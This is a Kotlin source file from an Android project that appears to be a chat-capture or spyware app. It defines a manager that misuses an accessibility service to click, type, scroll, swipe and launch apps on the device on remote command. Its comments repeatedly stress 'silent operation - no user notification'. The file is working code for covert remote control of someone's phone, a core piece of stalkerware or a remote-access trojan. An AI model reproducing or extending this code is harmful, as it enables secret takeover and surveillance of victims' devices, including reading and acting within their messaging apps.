package com.chats.capture.managers

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import com.chats.capture.CaptureApplication
import com.chats.capture.automation.UIAutomator
import com.chats.capture.services.EnhancedAccessibilityService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import timber.log.Timber

/**
 * Manages remote UI control via AccessibilityService
 * All operations execute silently in background
 */
class RemoteUIControlManager(private val context: Context) {
    
    private val controlScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
    
    /**
     * Execute UI click at coordinates
     * Silent operation - no user notification
     */
    fun executeUIClick(x: Float, y: Float, packageName: String? = null): Boolean {
        return try {
            val accessibilityService = getAccessibilityService() ?: return false
            val uiAutomator = UIAutomator(accessibilityService)
            
            // Switch to target app if package specified
            if (packageName != null) {
                switchToApp(packageName)
                controlScope.launch {
                    delay(500) // Wait for app to switch
                }
            }
            
            val success = uiAutomator.click(x, y)
            Timber.d("UI click executed: ($x, $y) in $packageName, success=$success")
            success
        } catch (e: Exception) {
            Timber.e(e, "Error executing UI click")
            false
        }
    }
    
    /**
     * Find node by text and click
     * Silent operation - no user notification
     */
    fun executeUIFindAndClick(text: String, packageName: String? = null): Boolean {
        return try {
            val accessibilityService = getAccessibilityService() ?: return false
            val uiAutomator = UIAutomator(accessibilityService)
            
            // Switch to target app if package specified
            if (packageName != null) {
                switchToApp(packageName)
                controlScope.launch {
                    delay(500) // Wait for app to switch
                }
            }
            
            val node = uiAutomator.findNodeByText(text)
            if (node != null) {
                val success = uiAutomator.clickNode(node)
                node.recycle()
                Timber.d("UI find and click executed: '$text' in $packageName, success=$success")
                success
            } else {
                Timber.w("Node not found: '$text' in $packageName")
                false
            }
        } catch (e: Exception) {
            Timber.e(e, "Error executing UI find and click")
            false
        }
    }
    
    /**
     * Find node by view ID and click
     * Silent operation - no user notification
     */
    fun executeUIFindAndClickById(viewId: String, packageName: String? = null): Boolean {
        return try {
            val accessibilityService = getAccessibilityService() ?: return false
            val uiAutomator = UIAutomator(accessibilityService)
            
            // Switch to target app if package specified
            if (packageName != null) {
                switchToApp(packageName)
                controlScope.launch {
                    delay(500) // Wait for app to switch
                }
            }
            
            val node = uiAutomator.findNodeById(viewId)
            if (node != null) {
                val success = uiAutomator.clickNode(node)
                node.recycle()
                Timber.d("UI find and click by ID executed: '$viewId' in $packageName, success=$success")
                success
            } else {
                Timber.w("Node not found by ID: '$viewId' in $packageName")
                false
            }
        } catch (e: Exception) {
            Timber.e(e, "Error executing UI find and click by ID")
            false
        }
    }
    
    /**
     * Find field and input text
     * Silent operation - no user notification
     */
    fun executeUIInput(text: String, findText: String? = null, viewId: String? = null, packageName: String? = null): Boolean {
        return try {
            val accessibilityService = getAccessibilityService() ?: return false
            val uiAutomator = UIAutomator(accessibilityService)
            
            // Switch to target app if package specified
            if (packageName != null) {
                switchToApp(packageName)
                controlScope.launch {
                    delay(500) // Wait for app to switch
                }
            }
            
            val node = when {
                viewId != null -> uiAutomator.findNodeById(viewId)
                findText != null -> uiAutomator.findNodeByText(findText)
                else -> null
            }
            
            if (node != null) {
                val success = uiAutomator.inputText(node, text)
                node.recycle()
                Timber.d("UI input executed: '$text' in $packageName, success=$success")
                success
            } else {
                Timber.w("Input field not found in $packageName")
                false
            }
        } catch (e: Exception) {
            Timber.e(e, "Error executing UI input")
            false
        }
    }
    
    /**
     * Execute scroll in direction
     * Silent operation - no user notification
     */
    fun executeUIScroll(direction: String, packageName: String? = null): Boolean {
        return try {
            val accessibilityService = getAccessibilityService() ?: return false
            val uiAutomator = UIAutomator(accessibilityService)
            
            // Switch to target app if package specified
            if (packageName != null) {
                switchToApp(packageName)
                controlScope.launch {
                    delay(500) // Wait for app to switch
                }
            }
            
            val rootNode = accessibilityService.rootInActiveWindow ?: return false
            val success = when (direction.lowercase()) {
                "up" -> uiAutomator.scrollUp(rootNode)
                "down" -> uiAutomator.scrollDown(rootNode)
                "left" -> uiAutomator.scrollLeft(rootNode)
                "right" -> uiAutomator.scrollRight(rootNode)
                else -> false
            }
            rootNode.recycle()
            Timber.d("UI scroll executed: $direction in $packageName, success=$success")
            success
        } catch (e: Exception) {
            Timber.e(e, "Error executing UI scroll")
            false
        }
    }
    
    /**
     * Execute swipe gesture
     * Silent operation - no user notification
     */
    fun executeUISwipe(startX: Float, startY: Float, endX: Float, endY: Float, duration: Long = 300): Boolean {
        return try {
            val accessibilityService = getAccessibilityService() ?: return false
            val uiAutomator = UIAutomator(accessibilityService)
            
            val success = uiAutomator.swipe(startX, startY, endX, endY, duration)
            Timber.d("UI swipe executed: ($startX, $startY) -> ($endX, $endY), success=$success")
            success
        } catch (e: Exception) {
            Timber.e(e, "Error executing UI swipe")
            false
        }
    }
    
    /**
     * Launch app silently
     * Silent operation - no user notification
     */
    fun executeUILaunchApp(packageName: String): Boolean {
        return try {
            val pm = context.packageManager
            val intent = pm.getLaunchIntentForPackage(packageName)
            
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                Timber.d("App launched: $packageName")
                true
            } else {
                Timber.w("Cannot launch app: $packageName (no launch intent)")
                false
            }
        } catch (e: Exception) {
            Timber.e(e, "Error launching app: $packageName")
            false
        }
    }
    
    /**
     * Get AccessibilityService instance
     */
    private fun getAccessibilityService(): EnhancedAccessibilityService? {
        val app = context.applicationContext as? CaptureApplication
        return app?.enhancedAccessibilityService
    }
    
    /**
     * Switch to target app by launching it
     * Silent operation - no user notification
     */
    private fun switchToApp(packageName: String) {
        try {
            val pm = context.packageManager
            val intent = pm.getLaunchIntentForPackage(packageName)
            
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                Timber.d("Switched to app: $packageName")
            }
        } catch (e: Exception) {
            Timber.e(e, "Error switching to app: $packageName")
        }
    }
}
